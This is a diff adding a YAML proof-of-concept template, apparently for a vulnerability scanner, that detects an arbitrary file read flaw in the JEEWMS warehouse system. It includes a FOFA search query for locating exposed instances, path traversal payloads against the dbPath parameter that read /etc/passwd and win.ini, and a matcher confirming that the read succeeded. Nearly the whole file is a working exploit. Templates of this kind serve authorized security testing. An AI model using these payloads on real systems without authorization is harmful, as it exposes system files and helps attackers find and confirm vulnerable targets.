@@ -1,0 +1,30 @@
+id: poc-yaml-jeewms-arbitrary-file-read
+info:
+  name: JEEWMS 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: JEEWMS
+  fofa: body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro" && body="仓"
+variables:
+  path: "systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd\n\
+    systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini \n"
+requests:
+- method: GET
+  path: /{{.path}}
+  expression: '(status_code == 200 && !contains(body,"<"))
+
+    &&
+
+    (
+
+    (contains(body,"root:") && contains(body,"/bin"))
+
+    ||
+
+    (contains(body,"[files]") && contains(body,"[fonts]"))
+
+    )
+
+    '
+transport: http
